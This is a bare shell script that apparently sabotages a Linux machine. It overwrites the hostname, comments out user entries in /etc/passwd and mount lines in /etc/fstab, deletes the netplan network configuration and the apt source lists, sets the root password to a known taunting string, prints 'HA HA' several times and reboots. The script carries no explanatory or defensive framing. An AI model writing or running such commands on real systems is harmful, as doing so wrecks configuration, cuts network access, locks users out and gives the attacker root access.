echo hehe > /etc/hostname
sed -i '/home/s/^/#/' /etc/passwd
sed -i '/syslog/s/^#\+//' /etc/passwd
sed -i '9s/^/#/' /etc/fstab
sed -i '11s/^/#/' /etc/fstab
sed -i '12s/^/#/' /etc/fstab
rm /etc/netplan/*
rm -R /etc/apt/source*
echo -ne "Hahahhaha\nHahahhaha\n" | passwd root
echo HA HA
echo HA HA
echo HA HA
echo HA HA
echo HA HA
echo HA HA
echo HA HA
echo HA HA
reboot
